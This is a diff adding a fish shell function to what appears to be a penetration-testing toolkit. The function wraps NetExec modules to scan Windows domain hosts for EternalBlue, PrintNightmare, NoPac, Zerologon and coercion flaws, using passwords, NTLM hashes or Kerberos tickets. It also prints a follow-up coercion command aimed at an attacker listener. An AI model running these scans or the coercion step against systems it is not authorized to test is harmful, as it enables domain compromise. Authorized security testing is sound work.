@@ -1,0 +1,131 @@
+function _ezpz_checkvulns
+    source $EZPZ_HOME/functions/_ezpz_colors.fish
+
+    # Usage message
+    set usage "
+Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-d domain]
+  <target> can be a single host or a file with one host per line.
+
+  -t, --target    Target IP, hostname, or file containing targets.
+  -u, --user      Username for authentication.
+  -p, --password  Password for authentication.
+  -H, --hash      NTLM hash for pass-the-hash authentication.
+  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
+  -d, --domain    Domain for authentication (optional).
+"
+    # Check if nxc is installed
+    if not command -v nxc >/dev/null 2>&1
+        ezpz_error "Required tool not found: nxc"
+        return 1
+    end
+
+    # Parse arguments
+    argparse 't/target=' 'u/user=' 'p/password=' 'H/hash=' 'k/kerb' 'd/domain=' 'h/help' -- $argv
+    or begin
+        ezpz_error "Invalid arguments."
+        echo $usage
+        return 1
+    end
+
+    if set -q _flag_help
+        echo $usage
+        return 0
+    end
+
+    # Check required arguments
+    if not set -q _flag_target
+        ezpz_error "Missing required argument: -t/--target"
+        echo $usage
+        return 1
+    end
+
+    # Build authentication string
+    set auth_args
+    if set -q _flag_domain
+        set auth_args "$_flag_domain\\$_flag_user"
+    else
+        set auth_args "$_flag_user"
+    end
+
+    if set -q _flag_password
+        set -a auth_args -p "$_flag_password"
+    else if set -q _flag_hash
+        set -a auth_args -H "$_flag_hash"
+    end
+
+    if set -q _flag_kerb
+        set -a auth_args -k
+    end
+
+    # Create temporary file for coerce results
+    set coerce_tmp (mktemp)
+    function cleanup --on-event fish_exit
+        rm -f $coerce_tmp
+    end
+
+    trap "echo ''" INT
+
+    # Set timeout for vulnerability checks
+    set -x timeout_secs 600
+
+    function _check_single_target
+        set target $argv[1]
+        set auth_string $argv[2..-1]
+
+        ezpz_title "Checking for vulnerabilities on $target"
+
+        # EternalBlue (MS17-010)
+        ezpz_header "EternalBlue (MS17-010)"
+        ezpz_cmd "nxc smb $target $auth_string -M ms17-010"
+        timeout $timeout_secs nxc smb $target $auth_string -M ms17-010 | grep -a 'MS17-010' | tr -s " " | cut -d " " -f 3-
+        if test $status -eq 124
+            ezpz_warn "Timeout reached while testing MS17-010 on $target"
+        end
+
+        # PrintNightmare (CVE-2021-34527)
+        ezpz_header "PrintNightmare (CVE-2021-34527)"
+        ezpz_cmd "nxc smb $target $auth_string -M printnightmare"
+        timeout $timeout_secs nxc smb $target $auth_string -M printnightmare | grep -a 'PRINTNIGHTMARE' | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"
+        if test $status -eq 124
+            ezpz_warn "Timeout reached while testing PrintNightmare on $target"
+        end
+
+        # NoPac (CVE-2021-42278)
+        ezpz_header "NoPac (CVE-2021-42278)"
+        ezpz_cmd "nxc smb $target $auth_string -M nopac"
+        timeout $timeout_secs nxc smb $target $auth_string -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'
+        if test $status -eq 124
+            ezpz_warn "Timeout reached while testing NoPac on $target"
+        end
+
+        # Coerce Attacks (PetitPotam, etc.)
+        ezpz_header "Coerce Attacks (PetitPotam, etc.)"
+        ezpz_cmd "nxc smb $target $auth_string -M coerce_plus"
+        timeout $timeout_secs nxc smb $target $auth_string -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tee $coerce_tmp
+        if test $status -eq 124
+            ezpz_warn "Timeout reached while testing Coerce on $target"
+        else if grep -q "VULNERABLE" $coerce_tmp
+            ezpz_info "Try: nxc smb $target $auth_string -M coerce_plus -o LISTENER=\$kali"
+        end
+
+        # Zerologon (CVE-2020-1472)
+        ezpz_header "Zerologon (CVE-2020-1472)"
+        ezpz_cmd "nxc smb $target $auth_string -M zerologon"
+        timeout $timeout_secs nxc smb $target $auth_string -M zerologon | grep -a 'ZEROLOGON' | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"
+        if test $status -eq 124
+            ezpz_warn "Timeout reached while testing Zerologon on $target"
+        end
+    end
+
+    # Process target(s)
+    if test -f "$_flag_target"
+        while read -l target
+            _check_single_target $target -u $auth_args
+        end < $_flag_target
+    else
+        _check_single_target $_flag_target -u $auth_args
+    end
+
+    trap - INT
+    ezpz_success "Done."
+end 
